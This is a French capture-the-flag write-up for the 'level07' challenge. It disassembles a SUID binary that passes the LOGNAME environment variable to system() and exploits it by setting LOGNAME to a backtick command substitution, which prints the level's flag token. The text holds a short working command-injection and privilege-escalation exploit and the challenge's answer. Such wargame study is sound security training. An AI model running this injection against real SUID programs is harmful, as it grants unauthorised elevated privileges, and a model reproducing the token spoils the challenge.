```bash
$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Encore un fichier qui a le bit SUID activé. On peut l'exécuter avec les droits de l'utilisateur flag07.

```bash
$ ./level07
level07
```

En disassemblant le binaire, on obtient les instructions suivantes :

```c
...
0x08048567 <+83>:    movl   $0x0,0x14(%esp)
0x0804856f <+91>:    movl   $0x8048680,(%esp)
0x08048576 <+98>:    call   0x8048400 <getenv@plt>       # 0x8048680 => "LOGNAME"
0x0804857b <+103>:   mov    %eax,0x8(%esp)
0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)         # 0x8048688 => "/bin/echo %s "
0x08048587 <+115>:   lea    0x14(%esp),%eax
0x0804858b <+119>:   mov    %eax,(%esp)
0x0804858e <+122>:   call   0x8048440 <asprintf@plt>
0x08048593 <+127>:   mov    0x14(%esp),%eax
0x08048597 <+131>:   mov    %eax,(%esp)
0x0804859a <+134>:   call   0x8048410 <system@plt>
0x0804859f <+139>:   leave
0x080485a0 <+140>:   ret
```

Globalement on voit un appel a getenv() qui récupère la valeur de la variable d'environnement "LOGNAME",
qui la passe ensuite à asprintf() pour construire une commande à exécuter avec system().

On peut donc exploiter cela en settant LOGNAME à une valeur que bash interprétera comme une commande :)

```bash
$ export LOGNAME=\`getflag\`
$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```